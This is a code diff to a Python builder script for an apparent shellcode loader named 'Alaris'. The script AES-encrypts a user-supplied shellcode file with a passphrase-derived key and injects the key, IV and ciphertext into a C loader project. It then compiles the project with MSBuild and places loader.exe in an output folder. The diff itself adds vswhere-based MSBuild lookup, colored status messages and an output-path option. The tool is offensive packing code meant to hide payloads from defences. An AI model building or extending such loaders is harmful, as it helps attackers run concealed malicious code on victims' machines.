@@ -1,12 +1,14 @@
 import re
 import os
+import shutil
 import base64
 import binascii
 import argparse
 import mimetypes
 import subprocess
-from Crypto.Cipher import AES
 import pbkdf2
+from Crypto.Cipher import AES
+from colorama import Fore, Back, Style
 
 
 def replace_key_iv_shellcode(key: str, iv: str, shellcode: str ) -> bool:
@@ -44,21 +46,17 @@ def replace_key_iv_shellcode(key: str, iv: str, shellcode: str ) -> bool:
 
 def get_msbuild_path() -> str:
     """
-    Queries the registry to get the location of MSBuild.exe
+    Uses the vswhere.exe application to enumerate the current Visual Studio
+    installed on the host. This is used to build a proper msbuild.exe path.
     """
     try:
-        reg_keys = [
-            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSBuild\\ToolsVersions\\4.0",
-            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSBuild\\ToolsVersions\\3.5"
-            ]
-        for key in reg_keys:
-            cmd = f"reg.exe query \"{key}\" /v MSBuildToolsPath"
-            p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-            out, err = p.communicate()
-            if p.returncode == 0:
-                break
-        msbuild_base_path = re.findall(r'C:\\\S+', out.decode("utf-8"))[0]
-        return f"{msbuild_base_path}MSBuild.exe"
+        p_files = os.getenv("ProgramFiles(x86)")
+        cmd = f"\"{p_files}\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath"
+        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        out, err = p.communicate()
+        if p.returncode != 0:
+            raise Exception("Cannot Find Visual Studio 2019+ Installation")
+        return f"\"{out.decode('utf-8').strip()}\MSBuild\Current\Bin\MSBuild.exe\""
     except KeyError as e:
         print(f"KeyError: {e}; Error: {err}")
         exit(1)
@@ -75,7 +73,6 @@ def compile() -> bool:
         msbuild = get_msbuild_path()
         project_file = f"{os.getcwd()}/loader/Alaris.sln"
         cmd = f"{msbuild} {project_file}"
-        print(cmd)
         p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         out, err = p.communicate()
         if p.returncode != 0:
@@ -84,7 +81,6 @@ def compile() -> bool:
     except Exception as e:
         print(f"Compile Error: {e}")
         return False
-
 
 
 def aes_pad(data: bytes) -> bytes:
@@ -124,6 +120,18 @@ def build_c_vars(data: bytes) -> str:
     return c_data
 
 
+def move_binary(path: str) -> str:
+    current_location = f"{os.getcwd()}/loader/x64/Release/loader.exe"
+    if os.path.exists(f"{path}/loader.exe"):
+        os.remove(f"{path}/loader.exe")
+    try:
+        shutil.move(current_location, path)
+    except:
+        path = os.getcwd()
+        shutil.move(current_location, path)
+    return path
+
+
 def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> str:
     """
     Takes in data to encrypt, a key, and an iv. Encrypts the
@@ -157,7 +165,7 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument(
         "-s",
-        "--shellcode_file",
+        "--shellcode",
         metavar="",
         dest="sc_file",
         required=True,
@@ -171,17 +179,37 @@ if __name__ == "__main__":
         required=True,
         help="Encryption Passphrase",
     )
+    parser.add_argument(
+        "-o",
+        "--out",
+        metavar='',
+        dest="out_path",
+        default=os.getcwd(),
+        required=False,
+        help="Output Path for compiled binary"
+    )
+
     args = parser.parse_args()
 
-    key, iv, salt = get_crypto_data("test")
+    key, iv, salt = get_crypto_data(args.enc_pass)
     c_key = "uint8_t key[32] = {%s};" % build_c_vars(key)
     c_iv = "uint8_t iv[16] = {%s};" % build_c_vars(iv)
+    print(f"{Fore.CYAN}[i] Key, IV Generation:{Fore.GREEN}\tSuccessful{Fore.RESET}")
+    print(f"{Fore.CYAN}\t[+] Key:{Fore.MAGENTA}\t{binascii.hexlify(key).decode('utf-8')}{Fore.RESET}")
+    print(f"{Fore.CYAN}\t[+] IV:{Fore.MAGENTA}\t\t{binascii.hexlify(iv).decode('utf-8')}{Fore.RESET}")
+    print(f"{Fore.CYAN}\t[+] Salt:{Fore.MAGENTA}\t{binascii.hexlify(salt).decode('utf-8')}{Fore.RESET}")
 
-
+    # Parsing and Encryption of Shellcode
     raw_shellcode = parse_shellcode(args.sc_file)
     raw_padded_shellcode = aes_pad(raw_shellcode)
     encrypted_encoded_shellcode = aes_encrypt(raw_padded_shellcode, key, iv)
+    print(f"{Fore.CYAN}[i] Encrypt Shellcode:{Fore.GREEN}\tSuccessful{Fore.RESET}")
+
     c_shellcode = f"shellcode = \"{encrypted_encoded_shellcode}\";"
 
-    #replace_key_iv_shellcode(c_key, c_iv, c_shellcode)
-    compile()
+    if replace_key_iv_shellcode(c_key, c_iv, c_shellcode):
+        print(f"{Fore.CYAN}[i] Variable Swap:{Fore.GREEN}\tSuccessful{Fore.RESET}")
+        if compile():
+            print(f"{Fore.CYAN}[i] Compiling:{Fore.GREEN}\t\tSuccessful{Fore.RESET}")
+            print(f"{Fore.CYAN}[i] Binary Location:{Fore.MAGENTA}\t{move_binary(args.out_path)}\loader.exe{Fore.RESET}")
+
